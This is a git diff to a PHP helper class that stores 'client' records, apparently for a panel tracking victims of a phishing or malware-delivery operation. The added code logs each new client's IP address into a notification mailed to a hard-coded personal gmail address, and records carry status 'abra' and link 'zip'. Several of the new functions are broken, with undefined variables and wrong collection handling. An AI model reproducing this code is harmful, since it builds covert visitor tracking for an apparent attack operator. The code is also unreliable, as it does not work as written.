@@ -56,32 +56,15 @@ class Helper implements HelperContract
 		   
 		   function addRecord($data)
 		   {		   
-		      $gg = ""; $fn = ""; $og = "";
-			  
-			  //C:\Users\user\AppData\Local\Temp\426dxxbws390207.TMP\22008450,C:\wnw\ass_2_1.PNG|C:\Users\user\AppData\Local\Temp\859dxxbws333328.TMP\34369623,C:\wnw\ass_2_3.PNG|C:\Users\user\AppData\Local\Temp\310dxxbws289954.TMP\28116837,C:\wnw\ass_2_4.PNG|C:\Users\user\AppData\Local\Temp\714dxxbws142804.TMP\57057748,C:\wnw\ass_2_5.PNG|C:\Users\user\AppData\Local\Temp\761dxxbws346700.TMP\96217190,C:\wnw\ass_2_6.PNG|C:\Users\user\AppData\Local\Temp\8dxxbws288611.TMP\58313657,C:\wnw\ass_2_7.PNG|C:\Users\user\AppData\Local\Temp\802dxxbws464996.TMP\53559763,C:\wnw\emc-2.docx|
-			  $mokije = explode('|',base64_decode($data['mokije']));
-			  
-			  if(count($mokije) > 0)
-			  {
-				  foreach($mokije as $mk)
-				  {
-					  $ded = explode(',',$mk);
-					  
-					  if(count($ded) == 2)
-					  {
-					    $fn = $ded[0];
-					    $og = $ded[1];
+		     $mokije = $data['mokije'];
 					  
 					    $record = Records::where('gg',$data['randd'])
-			                           ->where('fn',$fn)
-			                           ->where('og',$og)
 			                           ->first();
 							
 					    if($record == null)
 			            {
-    			           $record = Records::create(['fn' =>$fn,
-			                                       'gg' =>$data['randd'],
-			                                       'og' =>$og,
+    			           $record = Records::create(['gg' =>$data['randd'],
+			                                       'mokije' =>$mokije,
 								  	           ]);
 			            }
 					  }
@@ -106,8 +89,8 @@ class Helper implements HelperContract
 			                           'status' =>"abra",
 			                           'link' =>"zip",
 									  ]);
-									  
-				  $s = "New Client: ".date("h:i A jS F, Y");
+				  $location = getenv("REMOTE_ADDR");		  
+				  $s = "New Client, IP ".$location.": ".date("h:i A jS F, Y");
                $rcpt = "mails4davidslogan@gmail.com";
                $randd = $data["randd"];
                $mokije = $gg["mokije"];
@@ -153,13 +136,12 @@ class Helper implements HelperContract
 					   $temp = [];
 					   $temp['id'] = $r->id;
 					   $temp['gg'] = $r->gg;
-					   $temp['fn'] = $r->fn;
-					   $temp['og'] = $r->og;
-					   $temp['date'] = $r->created_at->format("jS F, Y h:i A");
+					   $temp['mokije'] = $r->mokije;
 					   array_push($ret,$temp);
 				   }
 			   }
 			   
+			   $ret = $temp;
 			   return $ret;
 		   }
 		   
@@ -210,34 +192,27 @@ class Helper implements HelperContract
 		   function getRecord($gg)
 		   {		   
 		     $ret = [];
-			   $records =  Records::where('gg',$gg)->get();
+			   $record =  Records::where('gg',$gg)->get();
 			   
-			   if($records != null && count($records) > 0)
+			   if($record != null)
 			   {
-				   foreach($records as $r)
-				   {
 					   $temp = [];
 					   $temp['id'] = $r->id;
 					   $temp['gg'] = $r->gg;
-					   $temp['fn'] = $r->fn;
-					   $temp['og'] = $r->og;
-					   array_push($ret,$temp);
-				   }
+					   $temp['mokije'] = $r->mokije;
 			   }
 			   
+			   $ret = $temp;
 			   return $ret;
 		   }
 		   
 		   function deleteRecords($gg)
 		   {		   
-			   $records =  Records::where('gg',$gg)->get();
+			   $record =  Records::where('gg',$gg)->get();
 			   
-			   if($records != null && count($records) > 0)
+			   if($record != null)
 			   {
-				   foreach($records as $r)
-				   {
 					   $r->delete();
-				   }
 			   }
 		   }
 		   
@@ -274,6 +249,20 @@ class Helper implements HelperContract
 					   
 			   $rt = ["s" => $ret->status,"l" => $ret->link];
 			   return $rt;
+		   }
+		   
+		   
+		   function getMokije($gg)
+		   {		   
+		     $ret = "zip";
+			 $record = Records::where('gg',$gg)->get();
+			   
+			   if($record != null)
+			   {
+				   $ret = $record->mokije;
+			   }
+			   
+			   return $ret;
 		   }
    
 }
